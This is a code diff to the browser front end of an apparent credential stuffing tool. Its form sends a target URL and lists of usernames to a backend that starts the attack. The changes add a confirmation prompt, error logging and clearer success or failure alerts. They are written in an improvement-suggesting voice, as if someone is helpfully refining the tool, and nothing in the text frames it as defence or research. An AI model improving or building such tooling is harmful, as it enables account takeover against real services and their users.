@@ -28,6 +28,11 @@ document.addEventListener('DOMContentLoaded', function() {
           return;
       }
 
+      // Consider adding a confirmation before initiating the attack
+      if (!confirm("Are you sure you want to initiate the credential stuffing attack?")) {
+        return;
+      }
+
       const payload = {
         targetUrl: targetUrl,
         usernames: usernames,
@@ -43,12 +48,19 @@ document.addEventListener('DOMContentLoaded', function() {
       })
       .then(response => {
         if (!response.ok) {
+          // Log the error on the server for better debugging. Consider sending a different status code.
+          console.error(`Server error: ${response.status} - ${response.statusText}`);
           throw new Error(`HTTP error! status: ${response.status}`);
         }
         return response.json();
       })
       .then(data => {
-        alert(data.message || 'Credential stuffing attack initiated.');
+        // Display a more informative message to the user.
+        if (data.success) {
+          alert(data.message || 'Credential stuffing attack initiated successfully.');
+        } else {
+          alert(data.message || 'Credential stuffing attack failed.');
+        }
       })
       .catch(error => {
         console.error('Error:', error);
